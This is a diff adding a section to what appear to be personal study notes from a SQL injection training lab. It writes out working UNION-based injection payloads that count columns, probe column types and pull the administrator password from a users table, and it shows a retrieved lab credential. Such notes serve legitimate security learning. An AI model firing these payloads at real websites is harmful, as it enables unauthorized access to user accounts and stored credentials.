@@ -24,6 +24,12 @@ example:
     a) '+Union+Select+username,+password+from+users+-- -> we got the creds
             username:    administrator
             password:    39i979
+            
+ 2.3.2 SQL injection UNION attack, retrieving multiple values in a single column
+ 
+    a) /filter?category='+order+by+2--  --> with 3 give an error. we have two columns
+    b) /filter?category=Pets'+union+select+null,'a'+--  --> only the second column is String type
+    c) /filter?category=Pets'+union+select+null,password+from+users+where+username+=+'administrator'+--  --> get admin pasword
 
 Examining the database
 
